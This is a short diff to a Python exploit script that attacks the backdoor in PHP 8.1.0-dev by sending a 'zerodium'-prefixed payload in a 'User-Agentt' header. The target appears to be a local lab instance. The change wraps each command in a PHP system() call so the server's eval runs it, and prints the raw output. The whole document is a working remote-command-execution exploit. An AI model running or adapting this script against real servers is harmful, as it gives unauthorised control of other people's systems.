@@ -12,8 +12,10 @@ TARGET = "http://localhost:9021"
 
 def exploit(cmd):
     """Exploit PHP 8.1.0-dev backdoor via User-Agentt header"""
+    # Wrap the system command in PHP since the server uses eval()
+    php_code = f"system('{cmd}');"
     headers = {
-        "User-Agentt": f"zerodium{cmd}"
+        "User-Agentt": f"zerodium{php_code}"
     }
     
     try:
@@ -36,13 +38,8 @@ def main():
     print("-" * 50)
     
     result = exploit(cmd)
-    # Extract command output from response (between <pre> tags)
-    if "<pre>" in result and "</pre>" in result:
-        start = result.find("<pre>") + 5
-        end = result.find("</pre>")
-        print(result[start:end])
-    else:
-        print(result[:500] if len(result) > 500 else result)
+    # The server no longer wraps output in <pre> tags
+    print(result)
 
 if __name__ == "__main__":
     main()
